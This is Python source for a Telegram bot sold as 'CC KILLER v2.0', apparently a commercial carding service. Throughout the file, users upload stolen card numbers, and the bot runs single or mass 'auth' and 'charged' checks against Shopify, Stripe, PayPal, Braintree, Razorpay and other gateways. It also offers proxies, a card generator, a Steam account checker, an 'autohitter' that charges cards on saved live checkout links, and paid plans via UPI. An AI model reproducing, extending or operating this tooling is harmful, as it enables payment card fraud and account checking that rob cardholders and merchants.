import asyncio
import os
from pyrogram import Client, filters, enums
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from config import API_ID, API_HASH, BOT_TOKEN, OWNER_ID, get_user_data, update_user_credits, set_user_vip, set_user_plan, UPI_ID, PAYMENT_QR_URL, WELCOME_PHOTO_URL, get_asset_path, DEVELOPER_NAME, PROJECT_NAME, PROJECT_TAG, add_hitter_url, remove_hitter_url, get_hitter_urls, load_hitter_urls, has_feature_access, grant_feature, revoke_feature
from security import authorized_filter, check_flood
import time
from tokenizer import extract_cards
from api_killer import run_all_gates, mass_killer, mass_specific_gate_runner
from stlear_killer import steal_cc_killer
from bin_detector import get_bin_info
from generator import generate_cards
from database import db
from gates import check_braintree_rotometals
try:
    from steam_gate import check_steam_account
except ImportError:
    async def check_steam_account(user, password):
        return {"status": "error", "response": "Steam module missing dependencies (Crypto/bs4)"}

# Session persistence - prevents FloodWait on every deploy
SESSION_STRING = os.getenv("SESSION_STRING", "")

if SESSION_STRING:
    app = Client("cc_killer_bot", session_string=SESSION_STRING, api_id=API_ID, api_hash=API_HASH)
    print("✅ Using persistent session")
else:
    app = Client("cc_killer_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
    print("⚠️ No SESSION_STRING set - using BOT_TOKEN (may cause FloodWait)")

# Store pending check data per user
pending_checks = {}
pending_mass_checks = {}
pending_autohit = {}

# Gate definitions for Auth vs Charged
AUTH_GATES = {
    "shopify": ("🛒 Shopify Auth", "shopify_auth"),
    "paypal": ("💰 PayPal Auth", "paypal"),
    "razorpay": ("🔷 Razorpay", "razorpay"),
    "stripe": ("💳 Stripe Auth", "stripe"),
    "braintree": ("🧠 Braintree Auth", "braintree"),
    "nmi": ("🔷 NMI Auth", "nmi"),
    "payflow": ("⚡ PayFlow Auth", "payflow"),
    "vbv": ("🔐 VBV 3D Auth", "vbv"),
}

CHARGED_GATES = {
    "shopify": ("🛒 Shopify Charge", "shopify"),
    "paypal": ("💰 PayPal Charge", "paypal_charge"),
    "razorpay": ("🔷 Razorpay Charge", "razorpay_charge"),
    "stripe": ("💳 Stripe Charge", "stripe_charge"),
    "braintree": ("🧠 Braintree Charge", "braintree_charge"),
    "fastspring": ("🚀 FastSpring Charge", "fastspring"),
}

async def get_text_from_message(client, message):
    """Helper to get text from message OR file."""
    ALLOWED_EXTENSIONS = ('.txt', '.cc', '.csv', '.log', '.dat', '.list')
    
    if message.document:
        if message.document.file_size > 1024 * 1024 * 5:
            return None, "❌ File too large (Max 5MB)."
        
        file_name = message.document.file_name.lower() if message.document.file_name else ""
        if not any(file_name.endswith(ext) for ext in ALLOWED_EXTENSIONS):
            return None, f"❌ Supported formats: {', '.join(ALLOWED_EXTENSIONS)}"
        
        dl_path = await client.download_media(message)
        with open(dl_path, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
        os.remove(dl_path)
        return content, None

    if message.reply_to_message and message.reply_to_message.document:
        doc = message.reply_to_message.document
        if doc.file_size > 1024 * 1024 * 5:
            return None, "❌ File too large."
        
        file_name = doc.file_name.lower() if doc.file_name else ""
        if not any(file_name.endswith(ext) for ext in ALLOWED_EXTENSIONS):
            return None, f"❌ Supported formats: {', '.join(ALLOWED_EXTENSIONS)}"
            
        dl_path = await client.download_media(message.reply_to_message)
        with open(dl_path, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
        os.remove(dl_path)
        return content, None

    if message.reply_to_message and message.reply_to_message.text:
        return message.reply_to_message.text, None
    
    if message.text:
        parts = message.text.split(None, 1)
        if len(parts) > 1:
            return parts[1], None
    
    return "", None

@app.on_message(filters.command(["start", "help"]))
async def start_cmd(client, message):
    loading_msg = await message.reply("<b>Starting OracleBot... Hold on ✋</b>")
    await asyncio.sleep(2)
    await loading_msg.delete()
    
    user = message.from_user
    user_id = user.id
    
    # Check for referral deep link (e.g. /start ref_ABCD1234)
    referral_code = None
    # Check for referral deep link (e.g. /start ref_ABCD1234)
    referral_code = None
    if message.command and len(message.command) > 1 and message.command[1].startswith("ref_"):
        referral_code = message.command[1].replace("ref_", "").upper()
        
        # Check if user is already registered
        existing = await db.get_user(user_id)
        if not existing or not existing.get('is_registered'):
            # Auto-register with referral
            user_data = await db.create_user(
                user_id=user_id,
                username=user.username,
                first_name=user.first_name,
                referral_code=referral_code
            )
            if user_data and user_data.get('referred_by'):
                await message.reply(
                    f"🎉 <b>Welcome! You've been referred!</b>\n\n"
                    f"✅ Auto-registered with referral code: <code>{referral_code}</code>\n"
                    f"💳 You received 10 FREE credits!\n"
                    f"🎁 Your referrer got +10 credits too!"
                )

    await show_main_menu(client, message, user_id, is_edit=False)

async def show_main_menu(client, message, user_id, is_edit=False):
    """Refactored Main Menu Display"""
    data = get_user_data(user_id)
    
    # Get DB user data for accurate credits
    db_user = await db.get_user(user_id)
    credits_display = 'UNLIMITED' if data.get('is_vip') else (db_user.get('credits', data.get('credits', 0)) if db_user else data.get('credits', 0))
    plan_display = db_user.get('plan', 'FREE') if db_user else data.get('plan', 'FREE')
    
    welcome_text = f"""
💀 <b>WELCOME TO CC KILLER v2.0</b> 💀
━━━━━━━━━━━━━━━━━━━━━━━
<i>The industry's most powerful, bulletproof, and turbo-charged CC checker is at your service.</i>

📌 <b>USER INFO:</b>
• ID: <code>{user_id}</code>
• Credits: <b>{credits_display}</b>
• Plan: <b>{plan_display}</b>
{f"• Expiry: <code>{data.get('expiry')}</code>" if data.get('expiry') else ""}

🚀 <b>SPEED:</b> 0.3s/card | 150+ Parallel
🛡️ <b>SECURITY:</b> Proxy Bound & Anti-Flood

<b>📜 QUICK START:</b>
• <code>/register</code> » Create Account
• <code>/chk</code> » Single Card Checker
• <code>/mchk</code> » Mass Card Checker
• <code>/kl</code> » CC Killer (Single)
• <code>/referral</code> » Earn Credits!

<b>Press the buttons below to interact:</b>
"""
    
    keyboard = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("📝 REGISTER", callback_data="quick_register"),
            InlineKeyboardButton("👤 PROFILE", callback_data="quick_profile"),
        ],
        [
            InlineKeyboardButton("⚡ CHECKER COMMANDS", callback_data="show_cmds"),
        ],
        [
            InlineKeyboardButton("🎯 AUTOHITTER", callback_data="show_autohitter"),
        ],
        [
            InlineKeyboardButton("💎 VIEW PLANS", callback_data="show_plans"),
            InlineKeyboardButton("📂 MY SITES", callback_data="show_sites"),
        ],
        [
            InlineKeyboardButton("💬 SUPPORT", url="https://t.me/Oracle0812"),
            InlineKeyboardButton("🔥 UPGRADE", callback_data="show_plans")
        ]
    ])
    
    if is_edit:
        # If the original message has media, and we want to change text, edit_caption is safer if we keep media
        # Or we can delete and send new if types don't match.
        # Simplest 'Back' behavior is often treating it like a new menu or editing text if no photo change needed.
        # But Welcome has a photo.
        try:
             await message.edit_caption(caption=welcome_text, reply_markup=keyboard)
        except:
             # If it fails (e.g. was text message), try edit_text
             try:
                 await message.edit_text(text=welcome_text, reply_markup=keyboard)
             except:
                 # Fallback: Delete and resend (if media type mismatch)
                  await message.delete()
                  photo_path = get_asset_path(WELCOME_PHOTO_URL)
                  if photo_path:
                      await message.reply_photo(photo_path, caption=welcome_text, reply_markup=keyboard)
                  else:
                      await message.reply_text(welcome_text, reply_markup=keyboard)
    else:
        photo_path = get_asset_path(WELCOME_PHOTO_URL)
        if photo_path:
            await message.reply_photo(photo_path, caption=welcome_text, reply_markup=keyboard)
        else:
            await message.reply_text(welcome_text, reply_markup=keyboard)

@app.on_callback_query()
async def handle_callbacks(client, callback_query):
    data = callback_query.data
    user_id = callback_query.from_user.id
    user = callback_query.from_user
    
    # Quick register from menu
    if data == "quick_register":
        existing = await db.get_user(user_id)
        if existing and existing.get('is_registered'):
            await callback_query.answer("Already registered! Use /profile to view.")
            return
        
        user_data = await db.create_user(
            user_id=user_id,
            username=user.username,
            first_name=user.first_name
        )
        
        if user_data:
            await callback_query.answer("Registered successfully! 🎉")
            await callback_query.edit_message_text(
                f"🎉 <b>REGISTRATION SUCCESSFUL!</b>\n\n"
                f"👤 <b>Name:</b> {user.first_name}\n"
                f"🆔 <b>ID:</b> <code>{user_id}</code>\n"
                f"💳 <b>Credits:</b> 10 (Welcome Gift!)\n"
                f"🎁 <b>Your Referral Code:</b> <code>{user_data.get('referral_code')}</code>\n\n"
                f"Share your referral code to earn +10 credits for each signup!\n"
                f"Use /referral to get your share link.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back_start")]])
            )
        return
    
    # Quick profile from menu
    elif data == "quick_profile":
        user_data = await db.get_user(user_id)
        if not user_data or not user_data.get('is_registered'):
            await callback_query.answer("Not registered! Click REGISTER first.")
            return
        
        await callback_query.answer()
        await callback_query.edit_message_text(
            f"👤 <b>YOUR PROFILE</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 <b>Name:</b> {user_data.get('first_name', 'N/A')}\n"
            f"🆔 <b>ID:</b> <code>{user_id}</code>\n\n"
            f"💰 <b>Credits:</b> {'UNLIMITED' if user_data.get('is_vip') else user_data.get('credits', 0)}\n"
            f"📈 <b>Plan:</b> {user_data.get('plan', 'FREE')}\n\n"
            f"🎁 <b>Referral Code:</b> <code>{user_data.get('referral_code', 'N/A')}</code>\n"
            f"👥 <b>Referrals:</b> {user_data.get('referral_count', 0)}",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔗 GET REFERRAL LINK", callback_data="show_referral")],
                [InlineKeyboardButton("🔙 BACK", callback_data="back_start")]
            ])
        )
        return
    
    # Show referral link
    elif data == "show_referral":
        user_data = await db.get_user(user_id)
        if not user_data:
            await callback_query.answer("Not registered!")
            return
        
        bot_info = await client.get_me()
        referral_link = f"https://t.me/{bot_info.username}?start=ref_{user_data.get('referral_code')}"
        
        await callback_query.answer()
        await callback_query.edit_message_text(
            f"🎁 <b>YOUR REFERRAL LINK</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🔗 <b>Code:</b> <code>{user_data.get('referral_code')}</code>\n\n"
            f"📎 <b>Share Link:</b>\n<code>{referral_link}</code>\n\n"
            f"👥 <b>Total Referrals:</b> {user_data.get('referral_count', 0)}\n"
            f"💰 <b>Credits Earned:</b> {user_data.get('referral_count', 0) * 10}\n\n"
            f"<i>💡 Share your link! +10 credits per signup!</i>",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="quick_profile")]])
        )
        return
    
    elif data == "show_cmds":
        cmd_text = """
<b>╭── ⚡ CHECKER COMMANDS ⚡ ──╮</b>

<b>🟢 MAIN COMMANDS</b>
 ├ <code>/chk</code> » Single Card Checker
 ├ <code>/mchk</code> » Mass Card Checker
 ├ <code>/kl</code>  » CC Killer (Single)
 └ <code>/b3</code>  » B3 Charge ($54)

<b>🔵 TOOLS & MANAGE</b>
 ├ <code>/gen</code> » Card Generator
 ├ <code>/steam</code> » Steam Checker
 ├ <code>/setproxy</code> » Set Proxy
 ├ <code>/addsite</code>  » Add Merchant
 └ <code>/plans</code>    » Subscription

<b>╰──────────────────────────╯</b>
        """
        await callback_query.answer()
        await callback_query.edit_message_text(cmd_text, reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("📘 COMMAND GUIDE", callback_data="show_guide")],
            [InlineKeyboardButton("🔙 BACK", callback_data="back_start")]
        ]))
        
    elif data == "show_guide":
        guide_text = """
<b>📘 DETAILED USER GUIDE</b>
━━━━━━━━━━━━━━━━━━━━━━━

<b>1️⃣ WHAT ARE THE CHECK TYPES?</b>
• <b>AUTH:</b> Checks if card is live by authorizing $0 or $1 (No charge).
• <b>CHARGED:</b> Tries to charge money (e.g. $0.5, $10). Good for debit cards.

<b>2️⃣ HOW TO USE CHECKER?</b>
• <b>/chk:</b> Single card → Select Auth/Charged → Select Gate → Check!
• <b>/mchk:</b> Upload .txt or paste cards → Select Auth/Charged → Select Gate → Check!

<b>3️⃣ CC KILLER (/kl)</b>
• The Killer runs your card through ALL gates aggressively until it finds a hit.

<b>4️⃣ PROXY SYSTEM</b>
• <b>Shopify requires Proxy:</b> Use <code>/setproxy http://user:pass@ip:port</code>

<i>"Quality over Quantity - Always check your BIN first!"</i>
        """
        await callback_query.answer()
        await callback_query.edit_message_text(guide_text, reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("📜 BACK TO COMMANDS", callback_data="show_cmds")]
        ]))

    elif data == "show_sites":
        from config import load_sites
        sites = load_sites()
        sites_text = "📂 <b>YOUR ADDED SITES:</b>\n\n"
        if not sites:
            sites_text += "<i>No sites added yet.</i>"
        else:
            for s in sites:
                sites_text += f"• <code>{s}</code>\n"
        
        await callback_query.answer()
        await callback_query.edit_message_text(sites_text, reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 BACK", callback_data="back_start")]
        ]))
        
    elif data == "show_plans":
        plans_text = f"""
💎 <b>AVAILABLE PLANS:</b>
━━━━━━━━━━━━━━━━━━━━━━━
🔰 <b>BASIC PLAN</b>
• Credits: 100
• Price: $5
• Access: Standard Gates

🚀 <b>STANDARD PLAN</b>
• Credits: 500
• Price: $20
• Access: Standard Gates + Priority

👑 <b>ULTIMATE PLAN</b> (Recommended 🔥)
• Credits: 2000
• Price: $50
• Access: All Standard Gates

🛡️ <b>VIP PLAN</b>
• Credits: <b>UNLIMITED</b>
• Price: $100
• Access: VIP Gates
• Validity: 30 Days

🌟 <b>PREMIUM ADD-ONS (Pay Extra)</b>
• 🎮 Steam Checker: +$10
• 💳 B3 Charge ($54): +$15
• 🔷 Mass Razorpay: +$10
<i>(Contact Support to buy Add-ons)</i>

💳 <b>PAYMENT METHODS:</b>
• UPI ID: <code>{UPI_ID}</code>
• QR Code: Click button below

⚠️ <b>IMPORTANT: Send payment screenshot to support after paying!</b>

<b>Click a button below to request an upgrade:</b>
        """
        await callback_query.answer()
        await callback_query.edit_message_text(plans_text, reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔰 BASIC", callback_data="req_BASIC"), InlineKeyboardButton("🚀 STANDARD", callback_data="req_STANDARD")],
            [InlineKeyboardButton("👑 ULTIMATE", callback_data="req_ULTIMATE")],
            [InlineKeyboardButton("🛡️ VIP", callback_data="req_VIP")],
            [InlineKeyboardButton("🖼️ VIEW QR", callback_data="show_payment")],
            [InlineKeyboardButton("🔙 BACK", callback_data="back_start")]
        ]))
    
    elif data == "show_payment":
        payment_text = f"""
💰 <b>PAYMENT DETAILS:</b>
━━━━━━━━━━━━━━━━━━━━━━━
🆔 <b>UPI ID:</b> <code>{UPI_ID}</code>

📸 <b>Send screenshot after payment to:</b> @Oracle0812
        """
        await callback_query.answer()
        qr_path = get_asset_path(PAYMENT_QR_URL)
        if qr_path:
            await callback_query.message.reply_photo(qr_path, caption=payment_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="show_plans")]]))
        else:
            await callback_query.edit_message_text(payment_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="show_plans")]]))

    elif data.startswith("req_"):
        plan = data.split("_")[1].upper()
        user = callback_query.from_user
        await callback_query.answer(f"Request for {plan} sent to owner!", show_alert=True)
        
        owner_msg = f"""
🆕 <b>PLAN REQUEST</b>
━━━━━━━━━━━━━━━━━━━━━━━
👤 <b>User:</b> {user.first_name} (@{user.username if user.username else 'N/A'})
🆔 <b>ID:</b> <code>{user.id}</code>
💎 <b>Plan:</b> {plan}
        """
        await client.send_message(
            OWNER_ID, 
            owner_msg, 
            reply_markup=InlineKeyboardMarkup([
                [
                    InlineKeyboardButton("✅ APPROVE", callback_data=f"app_{plan}_{user.id}"),
                    InlineKeyboardButton("❌ DECLINE", callback_data=f"dec_{user.id}")
                ]
            ])
        )
        await callback_query.edit_message_text("✅ <b>Request Sent!</b>\nPlease wait for the owner to approve your request.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back_start")]]))

    elif data.startswith("app_"):
        _, plan, target_user_id = data.split("_")
        target_user_id = int(target_user_id)
        
        if set_user_plan(target_user_id, plan):
            await callback_query.answer(f"User {target_user_id} approved for {plan}!")
            await callback_query.edit_message_text(f"✅ <b>Approved!</b>\nUser <code>{target_user_id}</code> now has the <b>{plan}</b> plan.")
        else:
            await callback_query.answer("Error setting plan!")
        
        try:
            await client.send_message(target_user_id, f"🎉 <b>CONGRATULATIONS!</b>\nYour request for the <b>{plan}</b> plan has been <b>APPROVED</b> by the owner!\nType /start to see your updated balance.")
        except: pass

    elif data.startswith("dec_"):
        target_user_id = int(data.split("_")[1])
        await callback_query.answer(f"Request for {target_user_id} declined.")
        await callback_query.edit_message_text(f"❌ <b>Declined!</b>\nUser <code>{target_user_id}</code> request was rejected.")
        
        try:
            await client.send_message(target_user_id, "❌ <b>SORRY!</b>\nYour plan request was <b>DECLINED</b> by the owner. Please contact support for more info.")
        except: pass

    # ========== SINGLE CHECK (/chk) FLOW ==========
    elif data == "chk_auth":
        if user_id not in pending_checks:
            await callback_query.answer("❌ Session expired. Run /chk again.")
            return
        pending_checks[user_id]["type"] = "auth"
        await callback_query.answer("Auth mode selected!")
        await callback_query.edit_message_text(
            "📊 <b>SELECT GATE:</b>\n\nChoose a gateway for Auth check:",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🛒 Shopify", callback_data="chk_gate_shopify")],
                [InlineKeyboardButton("💰 PayPal", callback_data="chk_gate_paypal")],
                [InlineKeyboardButton("🔷 Razorpay", callback_data="chk_gate_razorpay")],
                [InlineKeyboardButton("💳 Stripe", callback_data="chk_gate_stripe")],
                [InlineKeyboardButton("🧠 Braintree", callback_data="chk_gate_braintree")],
                [InlineKeyboardButton("🔷 NMI", callback_data="chk_gate_nmi")],
                [InlineKeyboardButton("⚡ PayFlow", callback_data="chk_gate_payflow")],
                [InlineKeyboardButton("🔐 VBV 3D", callback_data="chk_gate_vbv")],
            ])
        )
    
    elif data == "chk_charged":
        if user_id not in pending_checks:
            await callback_query.answer("❌ Session expired. Run /chk again.")
            return
        pending_checks[user_id]["type"] = "charged"
        await callback_query.answer("Charged mode selected!")
        await callback_query.edit_message_text(
            "📊 <b>SELECT GATE:</b>\n\nChoose a gateway for Charged check:",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🛒 Shopify", callback_data="chk_gate_shopify")],
                [InlineKeyboardButton("💰 PayPal", callback_data="chk_gate_paypal")],
                [InlineKeyboardButton("🔷 Razorpay", callback_data="chk_gate_razorpay")],
                [InlineKeyboardButton("💳 Stripe", callback_data="chk_gate_stripe")],
                [InlineKeyboardButton("🧠 Braintree", callback_data="chk_gate_braintree")],
                [InlineKeyboardButton("🚀 FastSpring", callback_data="chk_gate_fastspring")],
            ])
        )
    
    elif data.startswith("chk_gate_"):
        gate_key = data.replace("chk_gate_", "")
        if user_id not in pending_checks:
            await callback_query.answer("❌ Session expired. Run /chk again.")
            return
        
        pending_data = pending_checks.pop(user_id)
        card = pending_data["card"]
        check_type = pending_data["type"]
        original_msg = pending_data["message"]
        
        if not update_user_credits(user_id, -1):
            await callback_query.answer("❌ Insufficient credits!")
            return
        
        await callback_query.answer(f"Processing with {gate_key.upper()}...")
        status_msg = await callback_query.edit_message_text(f"⚡ <b>Checking via {gate_key.upper()} ({check_type.upper()})...</b>")
        
        # Get the gate function
        gate_func = get_gate_function(gate_key, check_type)
        
        start_time = time.perf_counter()
        cc, mm, yy, cvv = card
        
        try:
            from config import get_proxy
            proxy = get_proxy()
            result = await gate_func(cc, mm, yy, cvv, proxy)
        except Exception as e:
            result = {"status": "error", "response": str(e), "gate": gate_key.upper()}
        
        end_time = time.perf_counter()
        time_taken = f"{end_time - start_time:.2f}"
        
        bin_data = get_bin_info(cc[:6])
        cc_full = '|'.join(card)
        extrap = f"{cc[:12]}xxxx|{mm}|{yy}|xxx"
        
        final_text = f"""
<b>{PROJECT_TAG} 〉 [{PROJECT_NAME} 💀]</b>
- ━━━━━━━━━━━━━━━━━━━━━━ -
<b>Card >_</b> <code>{cc_full}</code>
<b>$Status:</b> {result.get('status', 'N/A').upper()} ✨
<b>Response >_</b> {result.get('response', 'N/A')}
<b>$Extrap:</b> <code>{extrap}</code>
- ━━━━━━━━━━━━━━━━━━━━━━ -
<b>Bin info >_</b> <code>{cc[:6]}</code> | <b>Country:</b> {bin_data['country']} | {bin_data['flag']}
<b>$Info:</b> {bin_data['bank']} - {bin_data['type']} - {bin_data['level']}
- ━━━━━━━━━━━━━━━━━━━━━━ -
<b>Gate >_</b> {gate_key.upper()} ({check_type.upper()})
<b>$Proxy:</b> [LIVE ✨!] | <b>Time:</b> [{time_taken} Seconds!]
- ━━━━━━━━━━━━━━━━━━━━━━ -
<b>#Developer >_</b> {DEVELOPER_NAME} ☀️
        """
        
        await status_msg.edit(final_text)
        
        if result.get('status') in ["approved", "live", "success", "charged"]:
            result['gate'] = f"{gate_key.upper()} ({check_type.upper()})"
            await steal_cc_killer(client, original_msg, cc_full, result)

    # ========== MASS CHECK (/mchk) FLOW ==========
    elif data == "mchk_auth":
        if user_id not in pending_mass_checks:
            await callback_query.answer("❌ Session expired. Run /mchk again.")
            return
        pending_mass_checks[user_id]["type"] = "auth"
        await callback_query.answer("Auth mode selected!")
        await callback_query.edit_message_text(
            f"📊 <b>SELECT GATE:</b>\n\n📥 Cards loaded: <b>{len(pending_mass_checks[user_id]['cards'])}</b>\n\nChoose a gateway for Auth check:",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🛒 Shopify", callback_data="mchk_gate_shopify")],
                [InlineKeyboardButton("💰 PayPal", callback_data="mchk_gate_paypal")],
                [InlineKeyboardButton("🔷 Razorpay", callback_data="mchk_gate_razorpay")],
                [InlineKeyboardButton("💳 Stripe", callback_data="mchk_gate_stripe")],
                [InlineKeyboardButton("🧠 Braintree", callback_data="mchk_gate_braintree")],
                [InlineKeyboardButton("🔷 NMI", callback_data="mchk_gate_nmi")],
                [InlineKeyboardButton("⚡ PayFlow", callback_data="mchk_gate_payflow")],
                [InlineKeyboardButton("🔐 VBV 3D", callback_data="mchk_gate_vbv")],
            ])
        )
    
    elif data == "mchk_charged":
        if user_id not in pending_mass_checks:
            await callback_query.answer("❌ Session expired. Run /mchk again.")
            return
        pending_mass_checks[user_id]["type"] = "charged"
        await callback_query.answer("Charged mode selected!")
        await callback_query.edit_message_text(
            f"📊 <b>SELECT GATE:</b>\n\n📥 Cards loaded: <b>{len(pending_mass_checks[user_id]['cards'])}</b>\n\nChoose a gateway for Charged check:",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🛒 Shopify", callback_data="mchk_gate_shopify")],
                [InlineKeyboardButton("💰 PayPal", callback_data="mchk_gate_paypal")],
                [InlineKeyboardButton("🔷 Razorpay", callback_data="mchk_gate_razorpay")],
                [InlineKeyboardButton("💳 Stripe", callback_data="mchk_gate_stripe")],
                [InlineKeyboardButton("🧠 Braintree", callback_data="mchk_gate_braintree")],
                [InlineKeyboardButton("🚀 FastSpring", callback_data="mchk_gate_fastspring")],
            ])
        )
    
    elif data.startswith("mchk_gate_"):
        gate_key = data.replace("mchk_gate_", "")
        if user_id not in pending_mass_checks:
            await callback_query.answer("❌ Session expired. Run /mchk again.")
            return
        
        pending_data = pending_mass_checks.pop(user_id)
        cards = pending_data["cards"]
        check_type = pending_data["type"]
        original_msg = pending_data["message"]
        
        # RESTRICTION: Mass Razorpay
        if "razorpay" in gate_key.lower():
            if not has_feature_access(user_id, "mass_razorpay"):
                 await callback_query.answer("❌ RESTRICTED: Buy 'Mass Razorpay' Add-on to use this gate!", show_alert=True)
                 return

        if not update_user_credits(user_id, -5):
            await callback_query.answer("❌ Insufficient credits!")
            return
        
        await callback_query.answer(f"Processing with {gate_key.upper()}...")
        total = len(cards)
        status_msg = await callback_query.edit_message_text(f"📊 <b>Checking {total} cards with {gate_key.upper()} ({check_type.upper()})...</b>")
        
        gate_func = get_gate_function(gate_key, check_type)
        
        async def update_status(checked, total):
            if checked % 5 == 0 or checked == total:
                try:
                    await status_msg.edit(f"📊 <b>{gate_key.upper()} ({check_type.upper()})</b>\nProgress: <code>[{checked}/{total}]</code>")
                except: pass
        
        results = await mass_specific_gate_runner(cards, gate_func, status_callback=update_status)
        
        lives = [k for k, v in results.items() if v.get('status') in ["approved", "live", "success", "charged"]]
        
        report = f"""
📊 <b>MASS CHECK COMPLETE</b>
━━━━━━━━━━━━━━━━━━━━━━━
🎯 Gate: <b>{gate_key.upper()} ({check_type.upper()})</b>
📊 Stats: <b>{len(lives)}/{total} LIVE</b>
✅ Live List:
"""
        for card_cc in lives[:10]:
            report += f"• <code>{card_cc}</code>\n"
        
        if len(lives) > 10:
            report += f"<i>...and {len(lives)-10} more</i>"
            
        await status_msg.edit(report)
        
        for card_cc in lives:
            res = results[card_cc]
            res['gate'] = f"{gate_key.upper()} ({check_type.upper()})"
            await steal_cc_killer(client, original_msg, card_cc, res)

    # ========== AUTOHITTER FLOW ==========
    elif data == "show_autohitter":
        await callback_query.answer()
        autohitter_text = """
🎯 <b>AUTOHITTER MENU</b>
━━━━━━━━━━━━━━━━━━━━━━━
<i>Autohitter allows you to add checkout links for Stripe and Braintree gates. Bot will auto-hit on these websites with your cards.</i>

<b>Supported Gateways:</b>
• 💳 Stripe Checkout
• 🧠 Braintree Checkout

<b>Select Gateway to Manage:</b>
        """
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("💳 STRIPE HITTER", callback_data="hitter_stripe")],
            [InlineKeyboardButton("🧠 BRAINTREE HITTER", callback_data="hitter_braintree")],
            [InlineKeyboardButton("🔙 BACK", callback_data="back_start")]
        ])
        await callback_query.edit_message_text(autohitter_text, reply_markup=keyboard)
    
    elif data.startswith("hitter_") and not data.startswith("hitter_add_") and not data.startswith("hitter_run_") and not data.startswith("hitter_del_"):
        gateway = data.replace("hitter_", "")
        urls = get_hitter_urls(gateway)
        
        menu_text = f"""
🎯 <b>{gateway.upper()} AUTOHITTER</b>
━━━━━━━━━━━━━━━━━━━━━━━
<b>Saved URLs:</b> {len(urls)}
"""
        if urls:
            for i, url in enumerate(urls[:5], 1):
                short_url = url[:40] + "..." if len(url) > 40 else url
                menu_text += f"{i}. <code>{short_url}</code>\n"
            if len(urls) > 5:
                menu_text += f"<i>...and {len(urls)-5} more</i>\n"
        else:
            menu_text += "<i>No URLs added yet.</i>\n"
        
        menu_text += "\n<b>Select an action:</b>"
        
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("➕ ADD URL", callback_data=f"hitter_add_{gateway}")],
            [InlineKeyboardButton("📋 VIEW ALL URLs", callback_data=f"hitter_view_{gateway}")],
            [InlineKeyboardButton("🗑️ REMOVE URL", callback_data=f"hitter_rem_{gateway}")],
            [InlineKeyboardButton("🚀 RUN AUTOHIT", callback_data=f"hitter_run_{gateway}")],
            [InlineKeyboardButton("🔙 BACK", callback_data="show_autohitter")]
        ])
        await callback_query.answer()
        await callback_query.edit_message_text(menu_text, reply_markup=keyboard)
    
    elif data.startswith("hitter_add_"):
        gateway = data.replace("hitter_add_", "")
        pending_autohit[user_id] = {"action": "add", "gateway": gateway}
        await callback_query.answer()
        await callback_query.edit_message_text(
            f"➕ <b>ADD {gateway.upper()} URL</b>\n\n"
            f"Send the checkout URL for {gateway.upper()} gateway.\n\n"
            f"<b>Example:</b>\n<code>https://checkout.stripe.com/pay/cs_live_xxx#xxx</code>\n\n"
            f"<i>Send the URL now or /cancel to abort.</i>",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ CANCEL", callback_data=f"hitter_{gateway}")]])
        )
    
    elif data.startswith("hitter_view_"):
        gateway = data.replace("hitter_view_", "")
        urls = get_hitter_urls(gateway)
        
        if not urls:
            await callback_query.answer("No URLs added yet!")
            return
        
        view_text = f"📋 <b>ALL {gateway.upper()} URLs</b>\n━━━━━━━━━━━━━━━━━━━━━━━\n"
        for i, url in enumerate(urls, 1):
            view_text += f"{i}. <code>{url}</code>\n"
        
        await callback_query.answer()
        await callback_query.edit_message_text(
            view_text,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data=f"hitter_{gateway}")]])
        )
    
    elif data.startswith("hitter_rem_"):
        gateway = data.replace("hitter_rem_", "")
        urls = get_hitter_urls(gateway)
        
        if not urls:
            await callback_query.answer("No URLs to remove!")
            return
        
        pending_autohit[user_id] = {"action": "remove", "gateway": gateway}
        
        remove_text = f"🗑️ <b>REMOVE {gateway.upper()} URL</b>\n\n"
        remove_text += "Send the <b>number</b> of the URL to remove:\n\n"
        for i, url in enumerate(urls, 1):
            short_url = url[:50] + "..." if len(url) > 50 else url
            remove_text += f"{i}. <code>{short_url}</code>\n"
        remove_text += "\n<i>Send the number now or /cancel to abort.</i>"
        
        await callback_query.answer()
        await callback_query.edit_message_text(
            remove_text,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ CANCEL", callback_data=f"hitter_{gateway}")]])
        )
    
    elif data.startswith("hitter_run_"):
        gateway = data.replace("hitter_run_", "")
        urls = get_hitter_urls(gateway)
        
        if not urls:
            await callback_query.answer("No URLs added! Add URLs first.")
            return
        
        pending_autohit[user_id] = {"action": "run", "gateway": gateway, "urls": urls}
        await callback_query.answer()
        await callback_query.edit_message_text(
            f"🚀 <b>RUN {gateway.upper()} AUTOHIT</b>\n\n"
            f"📥 URLs Loaded: <b>{len(urls)}</b>\n\n"
            f"Now send the card to auto-hit:\n<code>cc|mm|yy|cvv</code>\n\n"
            f"<i>Send the card now or /cancel to abort.</i>",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ CANCEL", callback_data=f"hitter_{gateway}")]])
        )

    elif data == "back_start":
        await callback_query.answer()
